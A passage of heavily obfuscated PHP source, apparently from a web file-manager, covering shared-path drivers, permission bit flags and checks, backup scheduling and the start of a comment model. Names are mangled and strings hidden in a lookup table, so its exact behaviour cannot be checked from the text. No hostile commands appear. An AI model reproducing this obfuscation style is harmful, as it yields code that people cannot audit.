$this->model->fileInfoGet($áÌòöô); $É¤Òºà´ = IO::copy($ÂåòÕ²•[$_SERVER[ñ÷§¡å][94]], $ï¢“†², !1, $Ç¸›‹İ’); return $É¤Òºà´; } public function setModifyTime($ø“Î½Ğ, $°ƒöÁîÌ = '') { $×ûÃ‰âó =& $_SERVER[ñ÷§¡å]; if (!$ø“Î½Ğ) { return; } $this->model->where(array($×ûÃ‰âó[426] => $ø“Î½Ğ))->save(array($×ûÃ‰âó[95] => $°ƒöÁîÌ)); } public function upload($äŒÄ«‡, $îˆ½ÆÄò, $ïÃŠƒ¦Ô = false, $¨Í–ù¶ğ = REPEAT_REPLACE) { $åÌª‘÷á =& $_SERVER[ñ÷§¡å]; $ß²ÔéÈ… = $this->parse($äŒÄ«‡); $‡õ¯ä¨ = $this->model->addFile($ß²ÔéÈ…[$åÌª‘÷á[408]], $îˆ½ÆÄò, $ß²ÔéÈ…[$åÌª‘÷á[94]], $ïÃŠƒ¦Ô, $¨Í–ù¶ğ); return $this->getPathOuter($‡õ¯ä¨); } public function uploadFileByID($½¢•…»Ë, $Åßîá¡‰, $öÕ¶Øß) { $Òºè÷ĞÜ =& $_SERVER[ñ÷§¡å]; $ å²™¡Â = $this->parse($½¢•…»Ë); $‡£ê±üÉ = $this->model->addFileByFileID($ å²™¡Â[$Òºè÷ĞÜ[408]], $Åßîá¡‰, $ å²™¡Â[$Òºè÷ĞÜ[94]], $öÕ¶Øß); return $this->getPathOuter($‡£ê±üÉ); } public function addFileByRemote($î“à¨Ôı, $ÌÛã½§, $óÒ¾Ö¶ = array(), $šÓÎŸÖÓ = '', $Ø„‚®ç) { $ÑçË÷Ëõ =& $_SERVER[ñ÷§¡å]; $çµ¬­ö¨ = $this->parse($î“à¨Ôı); $šÓÎŸÖÓ = empty($šÓÎŸÖÓ) ? $çµ¬­ö¨[$ÑçË÷Ëõ[94]] : $šÓÎŸÖÓ; $ãµ¨ó¤ = $this->model->addFileByRemote($çµ¬­ö¨[$ÑçË÷Ëõ[408]], $ÌÛã½§, $šÓÎŸÖÓ, $óÒ¾Ö¶, $Ø„‚®ç); return $this->getPathOuter($ãµ¨ó¤); } public function uploadLink($äÓşŞ, $–şÁóìÖ = 0) { $ÏéÉ‰“Ğ =& $_SERVER[ñ÷§¡å]; $±Ë†Áâé = $this->parse($äÓşŞ); $”Âí‘‚ä = _get($GLOBALS[$ÏéÉ‰“Ğ[7]], $ÏéÉ‰“Ğ[1336]); $’ÌÊ¬‰¯ = _get($GLOBALS[$ÏéÉ‰“Ğ[7]], $ÏéÉ‰“Ğ[1337]); $äÓşŞ = Model($ÏéÉ‰“Ğ[618])->createFileName($±Ë†Áâé[$ÏéÉ‰“Ğ[94]], $”Âí‘‚ä, $’ÌÊ¬‰¯); return IO::uploadLink($äÓşŞ, $–şÁóìÖ); } public function fileNameAuto($ƒÙí£çø, $µ–È¨ıø, $ìŞÆåÄ³ = REPEAT_REPLACE, $´”ÕÕ¢ó = false) { return $this->model->fileNameAuto($ƒÙí£çø, $µ–È¨ıø, $ìŞÆåÄ³, $´”ÕÕ¢ó); } public function fileNameExist($¹æ«¨üş, $Éá’ñ‰±) { return $this->model->fileNameExist($¹æ«¨üş, $Éá’ñ‰±); } protected function _fileOut($èúëò¢™, $ìÅ’ğê£ = false, $Ú÷¿´Íı = false, $È½¨µšÅ = '', $øí€„Ÿã = false) { $’ú•ö× =& $_SERVER[ñ÷§¡å]; $–˜‹ È¾ = $this->model->sourceInfo($èúëò¢™); if ($–˜‹ È¾[$’ú•ö×[419]] == $’ú•ö×[98]) { header($’ú•ö×[1338]); die; } $×ßùŸĞ = $this->model->fileInfoGet($èúëò¢™); $È½¨µšÅ = $×ßùŸĞ[$’ú•ö×[186]] ? $×ßùŸĞ[$’ú•ö×[186]] : $È½¨µšÅ; $áÖã£Ãê = isset($GLOBALS[$’ú•ö×[1339]]) ? $GLOBALS[$’ú•ö×[1339]] : $–˜‹ È¾[$’ú•ö×[32]]; if ($øí€„Ÿã) { return IO::fileOutServer($×ßùŸĞ[$’ú•ö×[94]], $ìÅ’ğê£, $áÖã£Ãê, $È½¨µšÅ); } IO::fileOut($×ßùŸĞ[$’ú•ö×[94]], $ìÅ’ğê£, $áÖã£Ãê, $È½¨µšÅ); } public function fileOut($™Š®Œò, $…Âû¬«æ = false, $¶Çæº­ = false, $üÉ¿Ÿ¾‡ = '') { $this->_fileOut($™Š®Œò, $…Âû¬«æ, $¶Çæº­, $üÉ¿Ÿ¾‡); } public function fileOutServer($Ø¼ˆÌÁÁ, $“Á²™¤ = false, $ßã¸‘ÒÖ = false, $ïÓÆÕÄ = '') { $this->_fileOut($Ø¼ˆÌÁÁ, $“Á²™¤, $ßã¸‘ÒÖ, $ïÓÆÕÄ, !0); } protected function _fileOutImage($œª‹ßœ‘, $ôöõø»Í = 250) { $â†éëÄê =& $_SERVER[ñ÷§¡å]; $£ç¬œªİ = $this->model->pathInfo($œª‹ßœ‘); if ($£ç¬œªİ[$â†éëÄê[419]] == $â†éëÄê[98]) { show_json($â†éëÄê[1340] . $œª‹ßœ‘, !1); } $ìàºÃêÌ = $this->model->fileInfoGet($œª‹ßœ‘); $ìàºÃêÌ[$â†éëÄê[32]] = $£ç¬œªİ[$â†éëÄê[32]]; $ìàºÃêÌ[$â†éëÄê[179]] = $£ç¬œªİ[$â†éëÄê[179]]; $GLOBALS[$â†éëÄê[1339]] = $ìàºÃêÌ[$â†éëÄê[32]]; $GLOBALS[$â†éëÄê[178]] = $ìàºÃêÌ; IO::fileOutImage($ìàºÃêÌ[$â†éëÄê[94]], $ôöõø»Í); } public function fileOutImage($´±„Â‚, $¾ŞÄ²ß´ = 250) { $this->_fileOutImage($´±„Â‚, $¾ŞÄ²ß´); } public function fileOutImageServer($ç„Ş„„¥, $´ûíÜ‡ = 250) { $this->_fileOutImage($ç„Ş„„¥, $´ûíÜ‡); } public function link($Ö¬àç¤õ, $‡îçÚç = '') { $Àù“¦‡ = $this->model->fileInfoGet($Ö¬àç¤õ); return IO::link($Àù“¦‡[$_SERVER[ñ÷§¡å][94]], $‡îçÚç); } protected function parse($øûïúó) { $Œ®ñº¾ =& $_SERVER[ñ÷§¡å]; if (strstr($øûïúó, $Œ®ñº¾[8]) === !1) { return array($Œ®ñº¾[428] => intval($øûïúó), $Œ®ñº¾[94] => $Œ®ñº¾[12], $Œ®ñº¾[1335] => array()); } $à«Ù‚¡Æ = explode($Œ®ñº¾[8], trim($øûïúó, $Œ®ñº¾[8])); if (count($à«Ù‚¡Æ) < 2) { show_tips(clear_html($øûïúó) . $Œ®ñº¾[1341]); } return array($Œ®ñº¾[428] => intval($à«Ù‚¡Æ[0]), $Œ®ñº¾[94] => $à«Ù‚¡Æ[1], $Œ®ñº¾[1335] => array_slice($à«Ù‚¡Æ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($êõ¦İ·’) { $this->pathParse = $êõ¦İ·’; $this->model = Model($_SERVER[ñ÷§¡å][1334]); } public function getPathOuter($´ÜœÖş) { $ø°‘ÃŒ© =& $_SERVER[ñ÷§¡å]; if (!$´ÜœÖş) { return $´ÜœÖş; } $½ƒêìÚË = $this->parse($´ÜœÖş); return trim(KodIO::makeShare($this->pathParse[$ø°‘ÃŒ©[408]], $½ƒêìÚË[$ø°‘ÃŒ©[408]]), $ø°‘ÃŒ©[8]); } protected function infoParse($ëêê¾§«, $¡ğÍĞÈª = false, $“Š‹™‹ = false) { $±¡‰æ¾í =& $_SERVER[ñ÷§¡å]; $şşÁ»²Ó = $this->pathParse[$±¡‰æ¾í[408]]; $Ãë‚¥Õµ = trim($this->pathParse[$±¡‰æ¾í[1176]], $±¡‰æ¾í[8]); return Action($±¡‰æ¾í[1342])->sharePathInfo($şşÁ»²Ó, $Ãë‚¥Õµ, $¡ğÍĞÈª); } public function infoFull($£Ÿ„Ş£) { $ğØ·—Òš =& $_SERVER[ñ÷§¡å]; $ê×­ò˜Ÿ = explode($ğØ·—Òš[8], trim($£Ÿ„Ş£, $ğØ·—Òš[8])); if (count($ê×­ò˜Ÿ) > 1) { $İ•ô¾éğ = implode($ğØ·—Òš[8], array_splice($ê×­ò˜Ÿ, 1)); $‘ÒİŞÔ = $this->model->pathInfoByPath($ê×­ò˜Ÿ[0], $İ•ô¾éğ); if (!$‘ÒİŞÔ) { return !1; } $this->pathParse[$ğØ·—Òš[1176]] = $‘ÒİŞÔ[$ğØ·—Òš[411]]; } return $this->infoParse($£Ÿ„Ş£); } public function listAll($°¥“¢ÌÂ) { $‚è‰ÊÂã =& $_SERVER[ñ÷§¡å]; $­›–Ï¼œ = IO::info($this->pathParse[$‚è‰ÊÂã[94]]); if (!$­›–Ï¼œ) { return array(); } $Î½¥Çô† = $this->model->listAll($°¥“¢ÌÂ); $Ê»ü®©© = Model($‚è‰ÊÂã[610])->getInfo($­›–Ï¼œ[$‚è‰ÊÂã[498]]); $ÅÉ€µ†ã = Action($‚è‰ÊÂã[1342]); foreach ($Î½¥Çô† as &$‘üŠÀ·) { check_abort(); $‘üŠÀ·[$‚è‰ÊÂã[96]] = $ÅÉ€µ†ã->_shareItemeParse($‘üŠÀ·[$‚è‰ÊÂã[96]], $Ê»ü®©©); } unset($‘üŠÀ·); return $Î½¥Çô†; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÏûˆÌ®Ü) { $this->pathParse = $ÏûˆÌ®Ü; $this->model = Model($_SERVER[ñ÷§¡å][1334]); } protected function infoParse($µªËÙÈñ, $í½£Ö™® = false, $†Ä‹çÇ = false) { $ì‰Â½ù =& $_SERVER[ñ÷§¡å]; return Action($ì‰Â½ù[1182])->sharePathInfo($this->pathParse[$ì‰Â½ù[94]], !0, $í½£Ö™®); } public function listPath($’—½ªÅˆ, $‡¬«Á²§ = false) { $‹éµÇÖº =& $_SERVER[ñ÷§¡å]; $“È ³ˆ = parent::listPath($’—½ªÅˆ, $‡¬«Á²§); if (!$“È ³ˆ) { return $“È ³ˆ; } if (is_array($“È ³ˆ[$‹éµÇÖº[1343]])) { $“È ³ˆ[$‹éµÇÖº[1343]] = Action($‹éµÇÖº[1182])->shareItemInfo($“È ³ˆ[$‹éµÇÖº[1343]]); } foreach ($“È ³ˆ as $í•ôÍöÇ => $æÚ‘şŒá) { if (!in_array($í•ôÍöÇ, array($‹éµÇÖº[93], $‹éµÇÖº[92]))) { continue; } foreach ($æÚ‘şŒá as $­¨Çã¿ => $À‚ú™Ê¬) { $“È ³ˆ[$í•ôÍöÇ][$­¨Çã¿] = Action($‹éµÇÖº[1182])->shareItemInfo($À‚ú™Ê¬); } } return $“È ³ˆ; } public function listAll($¼Øô¢Ş…) { $ğºĞéí” =& $_SERVER[ñ÷§¡å]; $Û–ı³ = IO::info($this->pathParse[$ğºĞéí”[94]]); if (!$Û–ı³) { return array(); } $‹íÉå’Í = $this->model->listAll($¼Øô¢Ş…); foreach ($‹íÉå’Í as &$Ë¨˜İÏ) { $Ë¨˜İÏ[$ğºĞéí”[96]] = Action($ğºĞéí”[1182])->shareItemInfo($Ë¨˜İÏ[$ğºĞéí”[96]]); } unset($Ë¨˜İÏ); return $‹íÉå’Í; } } goto fÃÖğÜ˜ñ; FŸí÷£İÅÆ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $£ÆÛÊËò =& $_SERVER[ñ÷§¡å]; $–¬£Ö„á = array(array($£ÆÛÊËò[429] => LNG($£ÆÛÊËò[1836]), $£ÆÛÊËò[1837] => $£ÆÛÊËò[1838], $£ÆÛÊËò[1839] => 1, $£ÆÛÊËò[1840] => 1, $£ÆÛÊËò[1841] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($£ÆÛÊËò[429] => LNG($£ÆÛÊËò[1842]), $£ÆÛÊËò[1837] => $£ÆÛÊËò[1843], $£ÆÛÊËò[1839] => 2, $£ÆÛÊËò[1840] => 1, $£ÆÛÊËò[1841] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($£ÆÛÊËò[429] => LNG($£ÆÛÊËò[1844]), $£ÆÛÊËò[1837] => $£ÆÛÊËò[1845], $£ÆÛÊËò[1839] => 3, $£ÆÛÊËò[1840] => 1, $£ÆÛÊËò[1841] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($£ÆÛÊËò[429] => LNG($£ÆÛÊËò[1846]), $£ÆÛÊËò[1837] => $£ÆÛÊËò[1847], $£ÆÛÊËò[1839] => 4, $£ÆÛÊËò[1840] => 1, $£ÆÛÊËò[1841] => self::AUTH_SHOW | self::AUTH_VIEW), array($£ÆÛÊËò[429] => LNG($£ÆÛÊËò[1848]), $£ÆÛÊËò[1837] => $£ÆÛÊËò[1849], $£ÆÛÊËò[1839] => 5, $£ÆÛÊËò[1840] => 1, $£ÆÛÊËò[1841] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($£ÆÛÊËò[429] => LNG($£ÆÛÊËò[1850]), $£ÆÛÊËò[1837] => $£ÆÛÊËò[1851], $£ÆÛÊËò[1839] => 6, $£ÆÛÊËò[1840] => 1, $£ÆÛÊËò[1841] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($£ÆÛÊËò[429] => LNG($£ÆÛÊËò[1852]), $£ÆÛÊËò[1837] => $£ÆÛÊËò[1853], $£ÆÛÊËò[1839] => 7, $£ÆÛÊËò[1840] => 1, $£ÆÛÊËò[1841] => 0)); return $–¬£Ö„á; } public static function authCheck($ŸôÈñÜ–, $ŞÔ˜õ÷—) { $âƒ¥‘¯ü =& $_SERVER[ñ÷§¡å]; $ŸôÈñÜ– = intval($ŸôÈñÜ–); if ($GLOBALS[$âƒ¥‘¯ü[512]] && $GLOBALS[$âƒ¥‘¯ü[6]][$âƒ¥‘¯ü[1854]]) { return !0; } if ($ŸôÈñÜ– <= 0) { return !1; } if (($ŸôÈñÜ– & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ŸôÈñÜ– & $ŞÔ˜õ÷—); } public static function authCheckShow($İ¹ÍåÃ) { return self::authCheck($İ¹ÍåÃ, self::AUTH_SHOW); } public static function authCheckView($ñ×¡……ã) { return self::authCheck($ñ×¡……ã, self::AUTH_VIEW); } public static function authCheckDownload($À¾Ÿ¤Ì´) { return self::authCheck($À¾Ÿ¤Ì´, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ö†å¤Ù) { return self::authCheck($ö†å¤Ù, self::AUTH_UPLOAD); } public static function authCheckEdit($ñ’ğí’Æ) { return self::authCheck($ñ’ğí’Æ, self::AUTH_EDIT); } public static function authCheckRemove($½˜õœ­×) { return self::authCheck($½˜õœ­×, self::AUTH_REMOVE); } public static function authCheckShare($“¡¢˜) { return self::authCheck($“¡¢˜, self::AUTH_SHARE); } public static function authCheckComment($Ş å’Ö›) { return self::authCheck($Ş å’Ö›, self::AUTH_COMMENT); } public static function authCheckEvent($éğ®îî) { return self::authCheck($éğ®îî, self::AUTH_EVENT); } public static function authCheckRoot($’“ŠöÏı) { return self::authCheck($’“ŠöÏı, self::AUTH_ROOT); } public static function authCheckAction($Í¡­á´», $à²Ô©í¸) { $¯Ãş£È =& $_SERVER[ñ÷§¡å]; $ÚŒÌÃ = array($¯Ãş£È[1855] => self::AUTH_VIEW, $¯Ãş£È[1206] => self::AUTH_DOWNLOAD, $¯Ãş£È[117] => self::AUTH_UPLOAD, $¯Ãş£È[1805] => self::AUTH_EDIT, $¯Ãş£È[1804] => self::AUTH_REMOVE, $¯Ãş£È[1815] => self::AUTH_SHARE, $¯Ãş£È[363] => self::AUTH_COMMENT, $¯Ãş£È[1651] => self::AUTH_EVENT, $¯Ãş£È[1856] => self::AUTH_ROOT); if (!isset($ÚŒÌÃ[$à²Ô©í¸])) { return; } $µûÎÖ˜¢ = $ÚŒÌÃ[$à²Ô©í¸]; $Í¡­á´» = intval($Í¡­á´»); if ($Í¡­á´» <= 0) { return !1; } if (($Í¡­á´» & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Í¡­á´» & $µûÎÖ˜¢); } public static function authDisable($¸¥üÈ£, $„ŞÒøê) { if (intval($¸¥üÈ£) <= 0) { return 0; } return intval($¸¥üÈ£) & ~$„ŞÒøê; } public $optionType = "\123\x79\x73\x74\x65\155\56\163\x6f\x75\162\x63\145\101\165\164\150\114\151\x73\164"; public $field = array("\156\x61\155\145", "\141\x75\x74\150", "\x6c\x61\x62\145\154", "\x64\x69\x73\x70\x6c\141\x79", "\x73\x79\163\x74\145\x6d", "\163\x6f\162\164"); public function initData() { $ŠÑì€óì = $this->authDefault(); foreach ($ŠÑì€óì as $‘‘›§¿) { $this->add($‘‘›§¿); } } public function findAuth($¢öÄÂƒö, $´éˆô©À) { $ÙÇäìÁ¦ =& $_SERVER[ñ÷§¡å]; $¯ºŸîïö = parent::listData(); foreach ($¯ºŸîïö as $ŒÙÌÄú¬) { $¡—Õ†è = intval($ŒÙÌÄú¬[$ÙÇäìÁ¦[422]]); if ($¡—Õ†è <= 0 || $ŒÙÌÄú¬[$ÙÇäìÁ¦[1857]] == 0) { continue; } if (($¡—Õ†è & $¢öÄÂƒö) != $¢öÄÂƒö) { continue; } if (($¡—Õ†è & $´éˆô©À) != 0) { continue; } return $ŒÙÌÄú¬[$ÙÇäìÁ¦[408]]; } return !1; } public function findAuthReadOnly() { $»§íñï = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Èœö×Îá = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($»§íñï, $Èœö×Îá); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $›Á°š—ù =& $_SERVER[ñ÷§¡å]; $Òš¼›ù¿ = parent::listData(); $•úºÊ° = !1; foreach ($Òš¼›ù¿ as $İÁŸ¶¤ë) { if ($İÁŸ¶¤ë[$›Á°š—ù[422]] <= 0 || $İÁŸ¶¤ë[$›Á°š—ù[1857]] == $›Á°š—ù[207]) { continue; } if (!$•úºÊ°) { $•úºÊ° = $İÁŸ¶¤ë; continue; } if ($•úºÊ°[$›Á°š—ù[422]] > $İÁŸ¶¤ë[$›Á°š—ù[422]]) { $•úºÊ° = $İÁŸ¶¤ë; } } return $•úºÊ° ? $•úºÊ°[$›Á°š—ù[408]] : $›Á°š—ù[12]; } public function listData($×…¦ô°¹ = false, $¦½ßÚˆ = "\x73\x6f\x72\x74", $Ÿ‹Öƒ©· = false) { return parent::listData($×…¦ô°¹, $¦½ßÚˆ, $Ÿ‹Öƒ©·); } public function update($‰Š§”ñ, $÷ÆËˆ¢×) { $§¦§¾ =& $_SERVER[ñ÷§¡å]; $÷é´’˜ = parent::listData($‰Š§”ñ); $™¹£Ûµ¸ = $this->findByName($÷ÆËˆ¢×[$§¦§¾[32]]); if (!$÷é´’˜ || $™¹£Ûµ¸ && $™¹£Ûµ¸[$§¦§¾[408]] != $÷é´’˜[$§¦§¾[408]]) { return !1; } $this->filterAuth($÷ÆËˆ¢×[$§¦§¾[422]]); return parent::update($‰Š§”ñ, $÷ÆËˆ¢×); } public function remove($æÄŞÚ‘) { $¼ÑˆÀÂû = parent::listData($æÄŞÚ‘); if (!$¼ÑˆÀÂû || $¼ÑˆÀÂû[$_SERVER[ñ÷§¡å][1283]]) { return !1; } return parent::remove($æÄŞÚ‘); } public function add($ê ë›ÊÂ = array()) { $óŸõîë– =& $_SERVER[ñ÷§¡å]; if ($this->findByName($ê ë›ÊÂ[$óŸõîë–[32]])) { return !1; } $Æ†˜õ¹É = array($óŸõîë–[32] => $óŸõîë–[12], $óŸõîë–[422] => 1, $óŸõîë–[1858] => $óŸõîë–[1845], $óŸõîë–[1857] => 1, $óŸõîë–[1283] => 0, $óŸõîë–[1859] => 0); $ê ë›ÊÂ = array_merge($Æ†˜õ¹É, $ê ë›ÊÂ); $ê ë›ÊÂ[$óŸõîë–[1859]] = $this->getSort(); $this->filterAuth($ê ë›ÊÂ[$óŸõîë–[422]]); return parent::insert($ê ë›ÊÂ); } private function getSort() { $ÄğŞ¯Øà =& $_SERVER[ñ÷§¡å]; $ãÅúôÆŠ = parent::listData(); $´ƒˆó²¿ = array_to_keyvalue($ãÅúôÆŠ, $ÄğŞ¯Øà[12], $ÄğŞ¯Øà[1859]); return empty($´ƒˆó²¿) ? 0 : max($´ƒˆó²¿) + 1; } private function filterAuth(&$äÂ£›Ö“) { if (!$äÂ£›Ö“) { return; } $ä°¯Êı¿ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $·¢¯³Œ = array(); foreach ($ä°¯Êı¿ as $¯­—öë×) { if ($äÂ£›Ö“ & $¯­—öë×) { $·¢¯³Œ[] = $¯­—öë×; } } if (in_array(self::AUTH_ROOT, $·¢¯³Œ)) { $äÂ£›Ö“ = array_sum($ä°¯Êı¿); return; } $º­²«Õæ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($·¢¯³Œ as $¯­—öë×) { if (isset($º­²«Õæ[$¯­—öë×])) { $·¢¯³Œ = array_merge($·¢¯³Œ, $º­²«Õæ[$¯­—öë×]); } } $·¢¯³Œ[] = self::AUTH_SHOW; $äÂ£›Ö“ = array_sum(array_unique($·¢¯³Œ)); } public function sort($şÕò¿ÊÀ, $©ï£Ûõì) { return parent::update($şÕò¿ÊÀ, $©ï£Ûõì); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x62\141\x63\153\165\160\x4c\x69\163\164"; public $field = array("\151\157", "\156\141\x6d\x65", "\163\164\141\164\x75\163", "\x63\x6f\x6e\164\x65\x6e\x74", "\155\141\x6e\x75\141\x6c", "\x72\x65\x73\x75\x6c\164", "\x74\151\x6d\x65\x46\162\157\x6d", "\164\x69\155\145\124\x6f"); public function config() { $‘ˆúğÖ’ =& $_SERVER[ñ÷§¡å]; $®ëš¼éÌ = Model($‘ˆúğÖ’[783])->get($‘ˆúğÖ’[793]); $®ëš¼éÌ = json_decode($®ëš¼éÌ, !0); $®ëš¼éÌ = is_array($®ëš¼éÌ) ? $®ëš¼éÌ : array(); if (!isset($®ëš¼éÌ[$‘ˆúğÖ’[768]])) { $®ëš¼éÌ[$‘ˆúğÖ’[768]] = $‘ˆúğÖ’[98]; } unset($®ëš¼éÌ[$‘ˆúğÖ’[1633]]); Action($‘ˆúğÖ’[1860])->taskInit(); Model($‘ˆúğÖ’[1632])->cacheClear(); $ˆ²Ñ°ÔÉ = $‘ˆúğÖ’[1861]; $Úš¹÷¢ = Model($‘ˆúğÖ’[1862])->findByKey($‘ˆúğÖ’[1651], $ˆ²Ñ°ÔÉ); if (!$Úš¹÷¢) { $Úš¹÷¢ = array(); } if (isset($Úš¹÷¢[$‘ˆúğÖ’[213]])) { $Úš¹÷¢[$‘ˆúğÖ’[213]] = json_decode($Úš¹÷¢[$‘ˆúğÖ’[213]], !0); } if (isset($®ëš¼éÌ[$‘ˆúğÖ’[213]])) { $Úš¹÷¢[$‘ˆúğÖ’[213]][$‘ˆúğÖ’[1636]] = $®ëš¼éÌ[$‘ˆúğÖ’[213]]; unset($®ëš¼éÌ[$‘ˆúğÖ’[213]]); } return array_merge($Úš¹÷¢, $®ëš¼éÌ); } public function listData($´œÖÍû× = false, $é¦«¾Ñ = "\x6d\157\x64\x69\146\x79\124\151\x6d\x65", $½»ö¦¼¥ = false) { return parent::listData($´œÖÍû×, $é¦«¾Ñ, !0); } public function lastItem() { $˜÷„Ë¹æ = $this->listData(); return !empty($˜÷„Ë¹æ[0]) ? $˜÷„Ë¹æ[0] : null; } public function kill($‹ÄòÌ¯ú) { $”×È‡óø =& $_SERVER[ñ÷§¡å]; $ÓÌÔ¸Ñ˜ = $this->listData($‹ÄòÌ¯ú); if (!$ÓÌÔ¸Ñ˜ || empty($ÓÌÔ¸Ñ˜[$”×È‡óø[32]])) { return !0; } Task::kill($”×È‡óø[792]); Task::kill($”×È‡óø[813]); Task::kill($”×È‡óø[822]); $ĞşËåïò = $ÓÌÔ¸Ñ˜[$”×È‡óø[32]]; $ú¿ÑÙ³æ = TEMP_FILES . $”×È‡óø[791] . $ĞşËåïò . $”×È‡óø[8]; IO::remove($ú¿ÑÙ³æ, !1); return $this->remove($‹ÄòÌ¯ú); } public function remove($µ€ã—‘„) { $õŒë÷Ñù = $this->listData($µ€ã—‘„); if (!$õŒë÷Ñù) { return !0; } return $this->backupRemove($õŒë÷Ñù); } private function backupRemove($Ê·Ÿªˆ±) { parent::remove($Ê·Ÿªˆ±[$_SERVER[ñ÷§¡å][408]]); $ÊèÎüˆ¬ = $this->backupPath($Ê·Ÿªˆ±); IO::remove($ÊèÎüˆ¬, !1); return !0; } private function backupPath($‚Ÿ˜»Š²) { $¡åñÇ ¢ =& $_SERVER[ñ÷§¡å]; $ÛíõÓè = $‚Ÿ˜»Š²[$¡åñÇ ¢[32]]; $îùÇ¹‘ğ = Model($¡åñÇ ¢[783])->get($¡åñÇ ¢[784]); $Çîš¸åÚ = substr(md5($¡åñÇ ¢[785] . $îùÇ¹‘ğ . $ÛíõÓè), 0, 8); return "\173\x69\157\72{$‚Ÿ˜»Š²[$¡åñÇ ¢[765]]}\175\x2f\x64\x61\x74\141\x62\141\163\x65\x2f\x62\141\x63\x6b\165\x70\x2f" . $ÛíõÓè . $¡åñÇ ¢[11] . $Çîš¸åÚ; } public function start() { $Ä•ó¼à =& $_SERVER[ñ÷§¡å]; if ($GLOBALS[$Ä•ó¼à[6]][$Ä•ó¼à[99]][$Ä•ó¼à[1863]] != $Ä•ó¼à[98]) { return !0; } $Ùîº’©Ø = $this->config(); if (!$Ùîº’©Ø || $Ùîº’©Ø[$Ä•ó¼à[1633]] != $Ä•ó¼à[98]) { return !1; } $Æ­³œº = $this->process(); foreach ($Æ­³œº as $Şšı«„) { if ($Şšı«„) { return Task::restart($Şšı«„[$Ä•ó¼à[408]]); } } $×¿ãÃ™— = new Backup(); $²ğÛ­ = $×¿ãÃ™—->db(); if ($²ğÛ­) { $²ğÛ­ = $×¿ãÃ™—->dbFile(); if ($²ğÛ­ && $Ùîº’©Ø[$Ä•ó¼à[768]] == $Ä•ó¼à[207]) { $²ğÛ­ = $×¿ãÃ™—->file(); } } Backup::set(array($Ä•ó¼à[763] => 1, $Ä•ó¼à[506] => time())); return !0; } public function process() { $¢Ù¢–® =& $_SERVER[ñ÷§¡å]; $ê¤ø“™ = array($¢Ù¢–®[771] => Task::get($¢Ù¢–®[792]), $¢Ù¢–®[775] => Task::get($¢Ù¢–®[813]), $¢Ù¢–®[209] => Task::get($¢Ù¢–®[822])); $•Ş£¿Ç¥ = !1; foreach ($ê¤ø“™ as &$’È€Œíô) { if ($•Ş£¿Ç¥) { $’È€Œíô = !1; continue; } if ($’È€Œíô) { $¼ÕŒ¨ = intval(_get($’È€Œíô, $¢Ù¢–®[1668], 0)); if (time() - $¼ÕŒ¨ > 7200) { Task::kill($’È€Œíô[$¢Ù¢–®[408]]); $•Ş£¿Ç¥ = !0; $’È€Œíô = !1; } } } return $ê¤ø“™; } public function restore() { $¿’Ùš« =& $_SERVER[ñ÷§¡å]; ActionCall($¿’Ùš«[1067], !0, 1); ActionCall($¿’Ùš«[1067], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\x6d\145\156\x74"; protected $tableMeta = array("\x74\141\x62\x6c\145\x4e\141\x6d\x65" => "\143\x6f\x6d\155\x65\x6e\x74\137\x6d\x65\x74\x61", "\155\145\x74\141\106\x69\x65\154\144" => "\143\157\155\x6d\x65\x6e\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($æ¾›İ‡Ü) { $¯–ŠüÔ› =& $_SERVER[ñ÷§¡å]; if ($æ¾›İ‡Ü[$¯–ŠüÔ›[1864]]) { $ç³ÑääÁ = $this->where(array($¯–ŠüÔ›[1865] => $æ¾›İ‡Ü[$¯–ŠüÔ›[1864]]))->find(); if 